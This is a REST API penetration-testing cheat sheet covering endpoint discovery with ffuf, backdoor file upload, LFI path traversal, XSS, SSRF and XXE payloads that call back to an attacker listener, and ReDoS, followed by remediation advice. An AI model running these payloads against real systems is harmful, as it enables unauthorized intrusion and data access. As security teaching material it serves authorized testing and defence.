# REST API Testing

> Quick recipes for REST API pentest — endpoint/parameter discovery, file upload, LFI, XSS, SSRF, ReDoS, XXE. Authorized testing only.

## TL;DR
- API testing reuses web-app techniques but in JSON/XML envelopes. Headers (`Authorization`, `Content-Type`, `Accept`) decide parsing path.
- Discover the route surface first (parameter brute force, common endpoint list, OpenAPI/Swagger leak).
- Always test object-level authorization (BOLA — see [./idor.md](../web/idor.md)) and unexpected verbs (see [../web/http-verb-tampering.md](../web/http-verb-tampering.md)).
- Map: OWASP API Security Top 10 — `api/owasp-api-top10.md` (Phase 6).

## Detection / Discovery

### Information Disclosure
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u http://<IP>/?FUZZ=test_value -fs <VALUE>
```

### Endpoint brute force
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt \
     -u http://<IP>/<API_NAME>/FUZZ
```

### Auth brute force
See bundled tooling: [../scripts/brute_api.py](../scripts/brute_api.py).

## Exploitation

### File upload
- Check accepted directory and `Content-Type`.
- Upload `backdoor.php` (or stack-equivalent) to the target.
- See [../scripts/web_shell.py](../scripts/web_shell.py) for a parameterized interactive shell client.

### LFI
```bash
curl http://<IP>/<API_NAME>/<ENDPOINT>/..%2f..%2f..%2f..%2fetc%2fhosts
```
See [../web/lfi-rfi.md](../web/lfi-rfi.md) for the full reference.

### XSS via API-rendered output
```html
<script>alert(document.domain)</script>
```
URL-encoded: `%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E`

See [../web/xss.md](../web/xss.md) for context-specific payloads.

### SSRF
```bash
nc -nlvp <PORT>
curl "http://<TARGET IP>/<ENDPOINT>/<METHOD>?id=http://<VPN/TUN Adapter IP>:<PORT>"

# Base64-encoded callback (common when API expects encoded URL)
echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
```

### Regular-Expression DoS (ReDoS)
```bash
curl "http://<TARGET IP>:3000/<API_NAME>/<METHOD>?email=test_value"
# Validate regex pattern on https://regex101.com (look for catastrophic backtracking).
```

### XXE on XML-accepting endpoints
DTD recap: a DTD defines the structure and legal elements of an XML document; external DTDs can be loaded from a URL. APIs accepting `application/xml` are XXE-able unless external entity resolution is disabled.

```bash
# OOB listener
nc -nlvp <PORT>

# Inject DOCTYPE on XML body
curl -X POST http://<TARGET IP>:3001/api/login \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
```
DTD primer (preserved from source): a DTD defines the structure and legal elements of an XML document; `DOCTYPE` declares special characters or strings used in the document. Internal DTDs exist; external DTDs can be loaded from a URL. See [../web/xxe.md](../web/xxe.md) for the full XXE reference.

## Defence / Remediation
- **Object-level authorization on every endpoint** — see [../web/idor.md](../web/idor.md). Single biggest API risk.
- **Allow-list HTTP methods** per route; return `405` for the rest.
- **Schema-validate** every request body (JSON Schema / OpenAPI validator) before reaching business logic.
- **Disable XML external entities** in every XML parser; prefer JSON-only APIs.
- **Rate-limit + auth-failure throttling** at gateway (per-token, per-IP, per-route).
- **No reflection of raw input** in responses; use server-side templates with context-aware encoding.

## Sources
- OWASP API Security Top 10 (2023): https://owasp.org/API-Security/editions/2023/en/0x00-header/
- OWASP API Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html
- HackTricks API pentest: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/rest-api-pentesting.html
- PayloadsAllTheThings API: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API
- SecLists API endpoint wordlists: https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
